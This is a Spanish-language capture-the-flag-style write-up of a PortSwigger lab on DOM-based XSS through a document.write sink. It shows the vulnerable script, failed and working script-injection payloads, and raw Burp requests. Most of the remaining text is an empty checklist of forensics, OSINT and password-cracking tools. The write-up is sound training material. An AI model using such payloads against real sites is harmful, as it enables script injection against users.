# 👨‍🏫 WRITEUP RESUMEN



<details>

<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>

## AUDITORIA DE: ((Laboratorio: DOM XSS en document.write el fregadero usando la fuente location.search))

***

***

### RECONOCIMIENTO PASIVO



### RECONOCIMIENTO PASIVO

*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    ANALIZANDO SCRIPT DE JAVASCRIPT QUE MANEJA LAS BUSQUEDAS PARA MOSTRARLAS EN ELDOM O SITIO:



    function trackSearch(query) {
            
                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
            }
            
            var query = (new URLSearchParams(window.location.search)).get('search');
            
            if(query) {
                trackSearch(query);
            }
                      
                      


    PROBANDO EN EL BROWSER DISTINTOS PAYLOADS:

                      

    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search=%22%3Cscript%3Ealert(%27P4IM0N%27);%3C/script%3E  NO



    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<script>alert('P4IM0N');</script> NO



    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="<scr<script>ipt>alert('P4IM0N');</scr</script>ipt>  NO


    "<sscrcscrrscr<script>ipt>alert('P4IM0N');</sscrcscrrscr</script>ipt> NO


    FUNCIONO:

    https://0a6000e604685435839f87cc004a0084.web-security-academy.net/?search="><script>alert('¡P4IM0N-XSS!')</script> SI

    ```

    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
    *

        <figure><img src="../../../.gitbook/assets/DOM-XSS (1).png" alt=""><figcaption></figcaption></figure>

***

***



</details>

🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫



<details>

<summary>🔬 ANALISIS FORENSE ❌</summary>

### ANALISIS FORENSE

*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DFF👈 (Digital Forensics Framework) [https://github.com/arxsys/dff](https://github.com/arxsys/dff)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSK👈 (The Sleuth Kit) [https://tools.kali.org/forensics/sleuthkit](https://tools.kali.org/forensics/sleuthkit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] X-WAYS Forensics👈 [https://www.x-ways.net/forensics/index-m.html](https://www.x-ways.net/forensics/index-m.html)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FOREMOST👈 [https://github.com/korczis/foremost](https://github.com/korczis/foremost)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HxD👈 [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HxD👈 [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] XXD👈 [https://tools.kali.org/forensics/xxd](https://tools.kali.org/forensics/xxd)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦



<details>

<summary>👊 RECONOCIMIENTO ACTIVO ✔️</summary>

### RECONOCIMIENTO ACTIVO



*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)

    ```python
    REQUEST EN BUSQUEDA NORMAL:




    GET /?search=elixir HTTP/2
    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8
    Connection: close




    RESPONSE 


    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 3654

    <!DOCTYPE html>
    <html>
        <head>
            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <title>DOM XSS in document.write sink using source location.search</title>
        </head>
        <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
                <section class='academyLabBanner'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h2>
                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink'>
                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                        <g>
                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                            <div class='widgetcontainer-lab-status is-notsolved'>
                                <span>LAB</span>
                                <p>Not solved</p>
                                <span class=lab-status-icon></span>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
            <div theme="blog">
                <section class="maincontainer">
                    <div class="container is-page">
                        <header class="navigation-header">
                            <section class="top-links">
                                <a href=/>Home</a><p>|</p>
                            </section>
                        </header>
                        <header class="notification-header">
                        </header>
                        <section class=blog-header>
                            <h1>0 search results for 'elixir'</h1>
                            <hr>
                        </section>
                        <section class=search>
                            <form action=/ method=GET>
                                <input type=text placeholder='Search the blog...' name=search>
                                <button type=submit class=button>Search</button>
                            </form>
                        </section>
                        <script>
                            function trackSearch(query) {
                                document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                trackSearch(query);
                            }
                        </script>
                        <section class="blog-list no-results">
                            <div class=is-linkback>
            <a href="/">Back to Blog</a>
                            </div>
                        </section>
                    </div>
                </section>
                <div class="footer-wrapper">
                </div>
            </div>
        </body>
    </html>


    ------



    REQUEST CON PAYLOAT ALERT:




    GET /?search="><script>alert('¡P4IM0N-XSS!')</script> HTTP/2
    Host: 0a6000e604685435839f87cc004a0084.web-security-academy.net
    Cookie: session=SeBs4anKs7nJTgKJ2MfEbzg8FRcgEEC1
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a6000e604685435839f87cc004a0084.web-security-academy.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8
    ```

    * CONCLUSION: LUEGO DE ANALIZAR EL SCRIPT Y COMO TRATA NUESTRA BUSQUEDA DENTRO DEL MISMO QUE CORRE SOBRE L MISMSO DOM, VEMOS QUE SI INGRESAMOS: "> CONJUNTAMENTE CON NUESTRO PAYLOAD : alert('¡P4IM0N-XSS!') , LO QUE LOGRAMOS HACER ES CERRAR LA RUTA DE SEARCHTERM Y CERRAR LA ETIQUETA IMG PARA QUE NUESTRO PAYLOAD SE EJECUTE E INGRESE EN EL DOM Y RESOLVIMOS EL LABORATORIO.
    *

        <figure><img src="../../../.gitbook/assets/DOM-XSS.png" alt=""><figcaption></figcaption></figure>

***

***

</details>

🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪



<details>

<summary>🕵️ INVESTIGACION OSINT ❌</summary>

### INVESTIGACION OSINT

*   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Maltego👈 --------------------------------->[https://www.kali.org/tools/maltego/](https://www.kali.org/tools/maltego/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Maltego👈 --------------------------------->[https://www.kali.org/tools/maltego/](https://www.kali.org/tools/maltego/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Recon-ng👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Recon-ng👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] theHarvester👈 --------------------------------->[https://www.kali.org/tools/theharvester/](https://www.kali.org/tools/theharvester/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] theHarvester👈 --------------------------------->[https://www.kali.org/tools/theharvester/](https://www.kali.org/tools/theharvester/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OSRFrameworK👈 --------------------------------->[https://www.kali.org/tools/osrframework/](https://www.kali.org/tools/osrframework/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SN0INT👈 --------------------------------->[https://www.kali.org/tools/sn0int/](https://www.kali.org/tools/sn0int/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OSINTGRAM👈 --------------------------------->[https://github.com/Datalux/Osintgram](https://github.com/Datalux/Osintgram)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TWOSINT👈 --------------------------------->[https://github.com/falkensmz/tw1tter0s1nt](https://github.com/falkensmz/tw1tter0s1nt)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X FACEBOOK👈 --------------------------------->[https://intelx.io/tools?tab=facebook](https://intelx.io/tools?tab=facebook)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X PERSONAS👈 --------------------------------->[https://intelx.io/tools?tab=person](https://intelx.io/tools?tab=person)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X TELEFONOS👈 --------------------------------->[https://intelx.io/tools?tab=telephone](https://intelx.io/tools?tab=telephone)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X Ubicación 2 Mapa👈 --------------------------------->[https://intelx.io/tools?tab=location](https://intelx.io/tools?tab=location)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X IMAGEN👈 --------------------------------->[https://intelx.io/tools?tab=image](https://intelx.io/tools?tab=image)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X NOMBRE DE USUARIO👈 --------------------------------->[https://intelx.io/tools?tab=username](https://intelx.io/tools?tab=username)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X HASH INVERSA👈 --------------------------------->[https://intelx.io/tools?tab=hash](https://intelx.io/tools?tab=hash)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X ARCHIVOS👈 --------------------------------->[https://intelx.io/tools?tab=file](https://intelx.io/tools?tab=file)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X VIN VEHICULOS👈 --------------------------------->[https://intelx.io/tools?tab=vin](https://intelx.io/tools?tab=vin)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩



<details>

<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>

### HASHES Y DESENCRIPTADOS

*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HASHCAT👈 --------------------------------->[https://www.kali.org/tools/hashcat/](https://www.kali.org/tools/hashcat/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RAINBOWCRACK👈 --------------------------------->[https://www.kali.org/tools/rainbowcrack/](https://www.kali.org/tools/rainbowcrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OPHCRACK👈 --------------------------------->[https://www.kali.org/tools/ophcrack/](https://www.kali.org/tools/ophcrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKSTATION👈 --------------------------------->[https://crackstation.net/](https://crackstation.net/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AIRCRACK-NG👈 --------------------------------->[https://www.kali.org/tools/aircrack-ng/ ](https://www.kali.org/tools/aircrack-ng/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/aircrack-ng-wireless-wi-fi-auditoria-y-fuerza-bruta-a-handshake)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AIRCRACK-NG👈 --------------------------------->[https://www.kali.org/tools/aircrack-ng/ ](https://www.kali.org/tools/aircrack-ng/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/aircrack-ng-wireless-wi-fi-auditoria-y-fuerza-bruta-a-handshake)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CAIN Y ABEL👈 --------------------------------->[https://github.com/xchwarze/Cain](https://github.com/xchwarze/Cain)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DAVEGRO1👈 --------------------------------->[https://github.com/octomagon/davegrohl](https://github.com/octomagon/davegrohl)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ElcomSoft Distributed Password Recovery👈 --------------------------------->[https://www.elcomsoft.es/edpr.html](https://www.elcomsoft.es/edpr.html)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACK RAR👈 --------------------------------->[https://github.com/TermuxHackz/Crack-rar](https://github.com/TermuxHackz/Crack-rar)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACK NINJA RAR👈 --------------------------------->[https://github.com/SHUR1K-N/RARNinja-RAR-Password-Cracking-Utility](https://github.com/SHUR1K-N/RARNinja-RAR-Password-Cracking-Utility)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCRACK👈 --------------------------------->[https://www.kali.org/tools/ncrack/](https://www.kali.org/tools/ncrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CEWL WORDLIST👈 --------------------------------->[https://www.kali.org/tools/cewl/ ](https://www.kali.org/tools/cewl/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/cewl)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRUNCH WORDLIST👈 --------------------------------->[https://www.kali.org/tools/crunch/ ](https://www.kali.org/tools/crunch/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/crunch)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
